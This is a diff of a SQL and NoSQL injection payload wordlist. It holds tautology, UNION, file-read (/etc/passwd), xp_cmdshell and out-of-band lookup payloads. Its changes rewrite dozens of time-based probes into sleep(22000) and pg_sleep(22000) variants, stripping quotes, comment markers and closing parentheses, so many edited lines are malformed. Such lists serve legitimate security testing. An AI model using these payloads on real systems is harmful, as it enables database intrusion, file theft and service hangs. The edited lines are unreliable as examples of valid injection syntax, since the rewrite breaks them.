@@ -55,9 +55,9 @@ db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emi
 '%20%26%26%20this.passwordzz.match(/.*/)//+%00
 {$gt: ''}
 [$ne]=1
-';sleep(5000);
-';sleep(5000);'
-';sleep(5000);+'
+';sleep(22000)
+';sleep(22000)
+';sleep(22000)
 ';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
 ’ or ‘1’=’1
 ' or '1'='1
@@ -113,18 +113,18 @@ db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emi
 ' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i
 ' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i
 ' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i
-sleep(22)#
-1 or sleep(22)#
-" or sleep(22)#
-' or sleep(22)#
-" or sleep(22)="
-' or sleep(22)='
-1) or sleep(22)#
-") or sleep(22)="
-') or sleep(22)='
-1)) or sleep(22)#
-")) or sleep(22)="
-')) or sleep(22)='
+sleep(22000)
+1 or sleep(22000)
+" or sleep(22000)
+' or sleep(22000)
+" or sleep(22000)
+' or sleep(22000)
+1) or sleep(22000)
+") or sleep(22000)
+') or sleep(22000)
+1)) or sleep(22000)
+")) or sleep(22000)
+')) or sleep(22000)
 ;waitfor delay '0:0:22'--
 );waitfor delay '0:0:22'--
 ';waitfor delay '0:0:22'--
@@ -304,18 +304,18 @@ IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
 benchmark(10000000,MD5(1))#
 update
 ";waitfor delay '0:0:__TIME__'--
-1) or pg_sleep(__TIME__)--
+1) or pg_sleep(22000)
 ||(elt(-3+5,bin(15),ord(10),hex(char(45))))
 hi"""") or (""""a""""=""""a"""
 delete
 like
-" or sleep(__TIME__)#
-pg_sleep(__TIME__)--
+" or sleep(22000)
+pg_sleep(22000)
 *(|(objectclass=*))
 declare @q nvarchar (200) 0x730065006c00650063 ...
  or 0=0 #
 insert
-1) or sleep(__TIME__)#
+1) or sleep(22000)
 ) or ('a'='a
 ; exec xp_regread
 *|
@@ -332,7 +332,7 @@ a"""" or 3=3--"""
 hi or 1=1 --"
 or a = a
  UNION ALL SELECT
-) or sleep(__TIME__)='
+) or sleep(22000)
 )) or benchmark(10000000,MD5(1))#
 hi' or 'a'='a
 0
@@ -348,7 +348,7 @@ hi') or ('a'='a
 a' waitfor delay '0:0:10'--
 1;(load_file(char(47,101,116,99,47,112,97,115, ...
 or%201=1
-1 or sleep(__TIME__)#
+1 or sleep(22000)
 or 1=1
  and 1 in (select var from temp)--
  or '7659'='7659
@@ -359,7 +359,7 @@ declare @s varchar (200) select @s = 0x73656c6 ...
 exec xp
 ; exec master..xp_cmdshell 'ping 172.10.1.255'--
 3.10E+17
- or pg_sleep(__TIME__)--"
+ or pg_sleep(22000)
 x' AND email IS NULL; --
 &
 admin' or '
@@ -386,30 +386,30 @@ x' AND members.email IS NULL; --
  or 1=1--
  and 1=( if((load_file(char(110,46,101,120,11 ...
 0x770061006900740066006F0072002000640065006C00 ...
-%20'sleep%2050'
+%20'sleep(22000)
 as
-1)) or pg_sleep(__TIME__)--
+1)) or pg_sleep(22000)
 /**/or/**/1/**/=/**/1
  union all select @@version--
 ,@variable
 (sqlattempt2)
  or (EXISTS)
 t'exec master..xp_cmdshell 'nslookup www.googl ...
-%20$(sleep%2050)
+%20$(sleep(22000)
 1 or benchmark(10000000,MD5(1))#
 %20or%20''='
 ||UTL_HTTP.REQUEST
- or pg_sleep(__TIME__)--
+ or pg_sleep(22000)
 hi' or 'x'='x';
-) or sleep(__TIME__)=
+) or sleep(22000)
  or 'whatever' in ('whatever')
 ; begin declare @var varchar(8000) set @var=' ...
  union select 1,load_file('/etc/passwd'),1,1,1;
 0x77616974666F722064656C61792027303A303A313027 ...
 exec(@s)
-) or pg_sleep(__TIME__)--
+) or pg_sleep(22000)
  union select
- or sleep(__TIME__)#
+ or sleep(22000)
  select * from information_schema.tables--
 a' or 1=1--
 a' or 'a' = 'a
@@ -418,7 +418,7 @@ declare @s varchar(22) select @s =
  or a=a--
  or '1'='1
 |
- or sleep(__TIME__)='
+ or sleep(22000)
  or 1 --'
 or 0=0 #"
 having
@@ -447,23 +447,23 @@ a' or 3=3--
 ; exec master..xp_cmdshell
 %20or%20x=x
 select
-)) or sleep(__TIME__)="""
+)) or sleep(22000)
 0x730065006c0065006300740020004000400076006500 ...
 hi' or 1=1 --
-") or pg_sleep(__TIME__)--
+") or pg_sleep(22000)
 %20or%20'x'='x
  or 'something' = 'some'+'thing'
 exec sp
 29 %
 (
 Ã½ or 1=1 --
-1 or pg_sleep(__TIME__)--
+1 or pg_sleep(22000)
 0 or 1=1
 ) or (a=a
 uni/**/on sel/**/ect
 replace
 %27%20or%201=1
-)) or pg_sleep(__TIME__)--
+)) or pg_sleep(22000)
 %7C
 x' AND 1=(SELECT COUNT(*) FROM tabname); --
 &apos;%20OR
@@ -479,7 +479,7 @@ or 0=0 --
 desc
 ||'6
 )
-1)) or sleep(__TIME__)#
+1)) or sleep(22000)
 or 0=0 #
  select name from syscolumns where id = (sele ...
 hi or a=a
@@ -492,7 +492,7 @@ to_timestamp_tz
 %2A%28%7C%28mail%3D%2A%29%29
 #NAME?
  or 1=1 /*
-)) or sleep(__TIME__)='
+)) or sleep(22000)
 or 1=1 or ""=
  or 1 in (select @@version)--
 sqlvuln;
@@ -506,7 +506,7 @@ a" or 1=1--
 //*
 %2A%7C
 " or 0=0 --
-)) or pg_sleep(__TIME__)--"
+)) or pg_sleep(22000)
 ?
  or 1/*
 !
@@ -561,18 +561,18 @@ t'exec master..xp_cmdshell 'nslookup www.google.com'--
 ' or ''='
 ' or 3=3
 ' or 3=3 --
-sleep(5)#
-1 or sleep(5)#
-" or sleep(5)#
-' or sleep(5)#
-" or sleep(5)="
-' or sleep(5)='
-1) or sleep(5)#
-") or sleep(5)="
-') or sleep(5)='
-1)) or sleep(5)#
-")) or sleep(5)="
-')) or sleep(5)='
+sleep(22000)
+1 or sleep(22000)
+" or sleep(22000)
+' or sleep(22000)
+" or sleep(22000)
+' or sleep(22000)
+1) or sleep(22000)
+") or sleep(22000)
+') or sleep(22000)
+1)) or sleep(22000)
+")) or sleep(22000)
+')) or sleep(22000)
 ;waitfor delay '0:0:5'--
 );waitfor delay '0:0:5'--
 ';waitfor delay '0:0:5'--
@@ -592,30 +592,30 @@ benchmark(10000000,MD5(1))#
 1)) or benchmark(10000000,MD5(1))#
 ")) or benchmark(10000000,MD5(1))#
 ')) or benchmark(10000000,MD5(1))#
-pg_sleep(5)--
-1 or pg_sleep(5)--
-" or pg_sleep(5)--
-' or pg_sleep(5)--
-1) or pg_sleep(5)--
-") or pg_sleep(5)--
-') or pg_sleep(5)--
-1)) or pg_sleep(5)--
-")) or pg_sleep(5)--
-')) or pg_sleep(5)--
-AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
-AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
-AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
-AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
-AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
-SLEEP(5)#
-SLEEP(5)--
-SLEEP(5)="
-SLEEP(5)='
-or SLEEP(5)
-or SLEEP(5)#
-or SLEEP(5)--
-or SLEEP(5)="
-or SLEEP(5)='
+pg_sleep(22000)
+1 or pg_sleep(22000)
+" or pg_sleep(22000)
+' or pg_sleep(22000)
+1) or pg_sleep(22000)
+") or pg_sleep(22000)
+') or pg_sleep(22000)
+1)) or pg_sleep(22000)
+")) or pg_sleep(22000)
+')) or pg_sleep(22000)
+AND (SELECT * FROM (SELECT(sleep(22000)
+AND (SELECT * FROM (SELECT(sleep(22000)
+AND (SELECT * FROM (SELECT(sleep(22000)
+AND (SELECT * FROM (SELECT(sleep(22000)
+AND (SELECT * FROM (SELECT(sleep(22000)
+sleep(22000)
+sleep(22000)
+sleep(22000)
+sleep(22000)
+or sleep(22000)
+or sleep(22000)
+or sleep(22000)
+or sleep(22000)
+or sleep(22000)
 waitfor delay '00:00:05'
 waitfor delay '00:00:05'--
 waitfor delay '00:00:05'#
@@ -625,33 +625,33 @@ benchmark(50000000,MD5(1))#
 or benchmark(50000000,MD5(1))
 or benchmark(50000000,MD5(1))--
 or benchmark(50000000,MD5(1))#
-pg_SLEEP(5)
-pg_SLEEP(5)--
-pg_SLEEP(5)#
-or pg_SLEEP(5)
-or pg_SLEEP(5)--
-or pg_SLEEP(5)#
+pg_sleep(22000)
+pg_sleep(22000)
+pg_sleep(22000)
+or pg_sleep(22000)
+or pg_sleep(22000)
+or pg_sleep(22000)
 '\"
-AnD SLEEP(5)
-AnD SLEEP(5)--
-AnD SLEEP(5)#
-&&SLEEP(5)
-&&SLEEP(5)--
-&&SLEEP(5)#
-' AnD SLEEP(5) ANd '1
-'&&SLEEP(5)&&'1
-ORDER BY SLEEP(5)
-ORDER BY SLEEP(5)--
-ORDER BY SLEEP(5)#
-(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
-(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
-(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
+AnD sleep(22000)
+AnD sleep(22000)
+AnD sleep(22000)
+&&sleep(22000)
+&&sleep(22000)
+&&sleep(22000)
+' AnD sleep(22000)
+'&&sleep(22000)
+ORDER BY sleep(22000)
+ORDER BY sleep(22000)
+ORDER BY sleep(22000)
+(SELECT * FROM (SELECT(sleep(22000)
+(SELECT * FROM (SELECT(sleep(22000)
+(SELECT * FROM (SELECT(sleep(22000)
 +benchmark(3200,SHA1(1))+'
-+ SLEEP(10) + '
++ sleep(22000)
 RANDOMBLOB(500000000/2)
 AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
 OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
 RANDOMBLOB(1000000000/2)
 AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
 OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
-SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
+sleep(22000)
